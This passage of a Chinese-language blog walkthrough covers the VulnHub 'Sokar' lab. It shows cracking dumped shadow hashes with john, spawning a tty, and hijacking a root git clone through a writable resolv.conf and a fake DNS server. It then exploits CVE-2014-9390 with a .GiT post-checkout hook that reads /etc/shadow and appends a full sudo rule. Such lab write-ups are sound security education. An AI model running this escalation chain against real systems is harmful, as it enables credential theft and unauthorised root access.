apophis:<span class="nv">$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz</span>/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
<span class="o">[</span>bynarr@sokar tmp<span class="o">]</span><span class="nv">$ </span>strings ram <span class="p">|</span> grep <span class="s2">&quot;root:&quot;</span>
strings ram <span class="p">|</span> grep <span class="s2">&quot;root:&quot;</span>
root:<span class="nv">$6$cWQYjirZ$rADNjUFSiHmYp</span>.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::</code></pre></div>


<p>拿到了疑似密碼hash，餵給john解</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/sokar# john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt password 
Warning: detected <span class="nb">hash type</span> <span class="s2">&quot;sha512crypt&quot;</span>, but the string is also recognized as <span class="s2">&quot;crypt&quot;</span> Use the <span class="s2">&quot;--format=crypt&quot;</span>
option to force loading these as that <span class="nb">type </span>instead Loaded <span class="m">2</span> password hashes with <span class="m">2</span> different salts
<span class="o">(</span>sha512crypt <span class="o">[</span>64/64<span class="o">])</span>
 
overdrive <span class="o">(</span>apophis<span class="o">)</span></code></pre></div>


<p>接著來登入apophis</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>su apophis
su apophis
standard in must be a tty
<span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
python -c <span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="o">[</span>bynarr@sokar ~<span class="o">]</span><span class="nv">$ </span>su apophis
su apophis
Password: overdrive

<span class="o">[</span>apophis@sokar bynarr<span class="o">]</span><span class="err">$</span></code></pre></div>


<p>在apophis的家目錄裡面發現一個程式(build)。擁有者是root，而且設有sticky bit，看起來非常可疑，直接執行看看</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>./build
./build
Build? <span class="o">(</span>Y/N<span class="o">)</span> Y
Y
Cloning into <span class="s1">&#39;/mnt/secret-project&#39;</span>...
ssh: Could not resolve hostname sokar-dev: Name or service not known
fatal: Could not <span class="nb">read </span>from remote repository.

Please make sure you have the correct access rights
and the repository exists.</code></pre></div>


<p>拿去餵狗後會發現是git的錯誤訊息，主因是找不到sokar-dev這個hostname</p>

<p>想說能不能輕鬆改個/etc/hosts連回攻擊端，不過只有root有寫入權限，只好想想其他辦法</p>

<p>找半天終於找到/etc/resolv.conf有可寫的權限，看來是要自己架一個DNS server和git repository了</p>

<p>參考這個<a href="https://www.youtube.com/watch?v=0F_q44U4PDM">影片</a>把DNS server架起來之後，因為不知道git要抓哪個路徑下的repository，先回sokar跑一次build看會不會再噴錯誤</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>./build
./build
Build? <span class="o">(</span>Y/N<span class="o">)</span> Y
Y
Cloning into <span class="s1">&#39;/mnt/secret-project&#39;</span>...
The authenticity of host <span class="s1">&#39;sokar-dev (192.168.2.128)&#39;</span> can<span class="s1">&#39;t be established.</span>
<span class="s1">RSA key fingerprint is d8:38:99:c5:d1:a1:ea:e7:48:cc:bc:d1:ad:bf:76:9c.</span>
<span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
<span class="s1">yes</span>
<span class="s1">Warning: Permanently added &#39;</span>sokar-dev,192.168.2.128<span class="s1">&#39; (RSA) to the list of known hosts.</span>
<span class="s1">root@sokar-dev&#39;</span>s password: <span class="c">###########</span>

fatal: <span class="s1">&#39;/root/secret-project&#39;</span> does not appear to be a git repository
fatal: Could not <span class="nb">read </span>from remote repository.

Please make sure you have the correct access rights
and the repository exists.</code></pre></div>


<p>回Kali把repository建起來</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">mkdir /root/secret-project
<span class="nb">cd</span> /root/secret-project
git init</code></pre></div>


<p>從sokar再執行一次build就能成功clone repository了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>./build
./build
Build? <span class="o">(</span>Y/N<span class="o">)</span> Y
Y
Cloning into <span class="s1">&#39;/mnt/secret-project&#39;</span>...
root@sokar-dev<span class="err">&#39;</span>s password: <span class="c">###########</span>

warning: You appear to have cloned an empty repository.
Checking connectivity... <span class="k">done</span>.</code></pre></div>


<p>做到這裡又卡住一陣子，最後靠google git exploit找到一個git的bug(<a href="https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/">CVE-2014-9390</a>)</p>

<p>但是要運用這個bug的前提是：檔案系統不會區分大小寫(case insensitive)</p>

<p>先來看看/mnt/secret-project所在的檔案系統</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar secret-project<span class="o">]</span><span class="nv">$ </span>mount
mount
/dev/sda1 on / <span class="nb">type </span>ext4 <span class="o">(</span>rw<span class="o">)</span>
proc on /proc <span class="nb">type </span>proc <span class="o">(</span>rw<span class="o">)</span>
sysfs on /sys <span class="nb">type </span>sysfs <span class="o">(</span>rw<span class="o">)</span>
devpts on /dev/pts <span class="nb">type </span>devpts <span class="o">(</span>rw,gid<span class="o">=</span>5,mode<span class="o">=</span>620<span class="o">)</span>
tmpfs on /dev/shm <span class="nb">type </span>tmpfs <span class="o">(</span>rw<span class="o">)</span>
/dev/sdb1 on /mnt <span class="nb">type </span>vfat <span class="o">(</span>rw,uid<span class="o">=</span>501,gid<span class="o">=</span>502<span class="o">)</span>
none on /proc/sys/fs/binfmt_misc <span class="nb">type </span>binfmt_misc <span class="o">(</span>rw<span class="o">)</span></code></pre></div>


<p>vfat是<a href="http://en.wikipedia.org/wiki/Case_sensitivity">case insensitive</a>的系統！ 接著就是實作的部分了！</p>

<p>先回Kali建個測試用的檔案</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/secret-project# mkdir .GiT
root@kali:~/secret-project# <span class="nb">cd</span> .GiT/
root@kali:~/secret-project/.GiT# mkdir hooks
root@kali:~/secret-project/.GiT# <span class="nb">cd </span>hooks/
root@kali:~/secret-project/.GiT/hooks# cat post-checkout
<span class="c">#!/bin/bash</span>
cat /etc/shadow</code></pre></div>


<p>將post-checkout設定成可執行後把新增的內容commit進repository</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/secret-project/.GiT/hooks# chmod +x post-checkout
root@kali:~/secret-project/.GiT/hooks# <span class="nb">cd</span> ..
root@kali:~/secret-project/.GiT# <span class="nb">cd</span> ..
root@kali:~/secret-project# git add .GiT
root@kali:~/secret-project# git commit -m <span class="s2">&quot;CVE-2014-9390&quot;</span>
<span class="o">[</span>master <span class="o">(</span>root-commit<span class="o">)</span> 7523455<span class="o">]</span> CVE-2014-9390
 Committer: root &lt;root@localhost.localdomain&gt;
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly:

    git config --global user.name <span class="s2">&quot;Your Name&quot;</span>
    git config --global user.email you@example.com

After doing this, you may fix the identity used <span class="k">for</span> this commit with:

    git commit --amend --reset-author

 <span class="m">1</span> file changed, <span class="m">2</span> insertions<span class="o">(</span>+<span class="o">)</span>
 create mode <span class="m">100755</span> .GiT/hooks/post-checkout</code></pre></div>


<p>回到sokar，把之前產生的repo砍掉後再跑一次build</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>rm -rf /mnt/secret-project
rm -rf /mnt/secret-project
<span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>./build
./build
Build? <span class="o">(</span>Y/N<span class="o">)</span> Y
Y
Cloning into <span class="s1">&#39;/mnt/secret-project&#39;</span>...
root@sokar-dev<span class="err">&#39;</span>s password: <span class="c">##########</span>

remote: Counting objects: 5, <span class="k">done</span>.
remote: Total <span class="m">5</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>
Receiving objects: 100% <span class="o">(</span>5/5<span class="o">)</span>, <span class="k">done</span>.
Checking connectivity... <span class="k">done</span>.
root:<span class="nv">$6$cWQYjirZ$rADNjUFSiHmYp</span>.UVdt4WYlmALhMXdkg9//9yuodQ2TFfiEWlAO0J6PRKesEfvu.3dfDb.7gTGgl/jesvFWs7l0:16434:0:99999:7:::
bin:*:15628:0:99999:7:::
daemon:*:15628:0:99999:7:::
adm:*:15628:0:99999:7:::
lp:*:15628:0:99999:7:::
sync:*:15628:0:99999:7:::
shutdown:*:15628:0:99999:7:::
halt:*:15628:0:99999:7:::
mail:*:15628:0:99999:7:::
uucp:*:15628:0:99999:7:::
operator:*:15628:0:99999:7:::
games:*:15628:0:99999:7:::
gopher:*:15628:0:99999:7:::
ftp:*:15628:0:99999:7:::
nobody:*:15628:0:99999:7:::
vcsa:!!:16386::::::
saslauth:!!:16386::::::
postfix:!!:16386::::::
sshd:!!:16386::::::
bynarr:<span class="nv">$6$UVZfMym7$9FFtl9Ky3ABFGErQlpQsKNOmAycJn4MlSRVHsSgVupDstQOifqqu3LvGwf3wmBvmfvh0IslwMo4</span>/mhZ3qnVrM/:16434:0:99999:7:::
apache:!!:16386::::::
apophis:<span class="nv">$6$0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz</span>/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::</code></pre></div>


<p>成功讀取到/etc/shadow！再來只要修改post-checkout的執行內容就能拿到root了</p>

<p>本來想說寫一個suid的程式讓post-checkout去編譯，寫到一半想到直接去改/etc/sudoers讓apophis得到全部的權限就可以了</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&quot;apophis   ALL=(ALL:ALL) ALL&quot;</span> &gt;&gt; /etc/sudoers</code></pre></div>


<p>修改完post-checkout後再回到sokar重新build過之後就來試試嶄新的sudo</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>apophis@sokar ~<span class="o">]</span><span class="nv">$ </span>sudo /bin/bash
sudo /bin/bash
<span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> apophis: overdrive

<span class="o">[</span>root@sokar apophis<span class="o">]</span><span class="c"># id</span>
id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="o">[</span>root@sokar apophis<span class="o">]</span><span class="c"># cat /root/flag</span>
cat /root/flag
                <span class="m">0</span>   0
                <span class="p">|</span>   <span class="p">|</span>
            ____<span class="p">|</span>___<span class="p">|</span>____
         <span class="m">0</span>  <span class="p">|</span>~ ~ ~ ~ ~ ~<span class="p">|</span>   0
         <span class="p">|</span>  <span class="p">|</span>   Happy   <span class="p">|</span>   <span class="p">|</span>
      ___<span class="p">|</span>__<span class="p">|</span>___________<span class="p">|</span>___<span class="p">|</span>__
      <span class="p">|</span>/<span class="se">\/\/\/\/\/\/\/\/\/\/\/</span><span class="p">|</span>
  <span class="m">0</span>   <span class="p">|</span>    B i r t h d a y    <span class="p">|</span>   0
  <span class="p">|</span>   <span class="p">|</span>/<span class="se">\/\/\/\/\/\/\/\/\/\/\/</span><span class="p">|</span>   <span class="p">|</span>
 _<span class="p">|</span>___<span class="p">|</span>_______________________<span class="p">|</span>___<span class="p">|</span>__
<span class="p">|</span>/<span class="se">\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/</span><span class="p">|</span>
<span class="p">|</span>                                   <span class="p">|</span>
<span class="p">|</span>     V  u  l  n  H  u  b   ! !     <span class="p">|</span>
<span class="p">|</span> ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ <span class="p">|</span>
<span class="p">|</span>___________________________________<span class="p">|</span>

<span class="o">=====================================</span>
<span class="p">|</span> Congratulations on beating Sokar! <span class="p">|</span>
<span class="p">|</span>                                   <span class="p">|</span>
<span class="p">|</span>  Massive shoutout to g0tmi1k and  <span class="p">|</span>
<span class="p">|</span> the entire community which makes  <span class="p">|</span>
<span class="p">|</span>         VulnHub possible!         <span class="p">|</span>
<span class="p">|</span>                                   <span class="p">|</span>
<span class="p">|</span>    rasta_mouse <span class="o">(</span>@_RastaMouse<span class="o">)</span>     <span class="p">|</span>
<span class="o">=====================================</span></code></pre></div>

]]></content>
  </entry>
  
</feed>
